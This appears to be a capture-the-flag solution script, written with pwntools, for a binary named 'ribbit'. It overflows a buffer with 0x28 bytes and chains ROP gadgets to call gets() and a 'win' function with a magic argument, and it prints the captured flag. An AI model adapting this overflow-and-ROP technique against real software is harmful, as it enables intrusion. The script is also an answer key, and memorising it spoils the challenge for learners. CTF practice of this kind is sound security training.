from pwn import *

conn = remote('chal.nbctf.com', 30170)

# context.terminal = ['tmux','splitw','-h']
# conn = process('./ribbit')
# gdb.attach(pidof(conn)[0], 'b *0x401923')

elf = ELF('./ribbit')

pop_rdi = 0x40201f
pop_rsi_r15 = 0x40201d

yougotthis = 0x498013
justdoit = 0x498021

strcpy = 0x41c240
gets = 0x40c630
bss_writable = 0x4c5250
target_f = elf.functions['win'].address

# strcpy is fake??
write_str1 = p64(pop_rdi) + p64(bss_writable) + p64(pop_rsi_r15) + \
            p64(yougotthis) + p64(0) + p64(strcpy)
write_str2 = p64(pop_rdi) + p64(bss_writable + 0x15) + p64(pop_rsi_r15) + \
            p64(justdoit) + p64(0) + p64(strcpy)

gets_str = p64(pop_rdi) + p64(bss_writable) + p64(gets)

final_rop = p64(pop_rdi) + p64(0xf10c70b33f) \
               + p64(pop_rsi_r15) + p64(bss_writable) + p64(0) + p64(target_f)


# getshell = p64()


conn.sendline(b'A'*0x28 + gets_str + final_rop )
conn.sendline(b'You got this!'.ljust(0x15, b'\x00') + b'Just do it!')

conn.interactive()

# nbctf{ur_w3lc0m3_qu454r_5abf2e}